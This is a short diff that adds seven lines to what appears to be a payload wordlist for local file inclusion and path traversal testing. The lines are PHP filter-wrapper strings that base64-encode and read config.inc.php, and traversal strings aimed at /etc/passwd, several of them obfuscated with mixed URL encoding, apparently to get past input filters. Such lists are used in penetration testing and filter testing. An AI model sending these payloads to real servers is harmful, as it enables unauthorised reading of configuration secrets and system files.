@@ -1,0 +1,7 @@
+php://filter/read=convert.base64-encode/resource=../../config.inc.php
+%70hp://%66il%74e%72/rea%64%3dco%6eve%72%74.%62ase%36%34-%65%6eco%64e/resou%72c%65%3d%2e%2e%2f..%2f%63onfig.%69n%63%2eph%70
+....//....//....//etc/passwd
+%2e%2e..%2f/.%2e%2e.%2f/.%2e%2e%2e/%2fetc/%70%61s%73%77%64
+..../%2f.%2e%2e%2e%2f%2f.%2e%2e%2e%2f%2f%65tc%2fp%61s%73%77d
+php%3a/%2ffilt%65r/r%65%61%64%3d%63on%76ert%2e%62ase%364-%65n%63o%64e/re%73ou%72ce%3d%2e./.%2e/%63o%6ef%69%67.%69n%63%2eph%70
+.%2e..%2f%2f..%2e%2e%2f%2f%2e.%2e.%2f%2fet%63/p%61%73s%77d
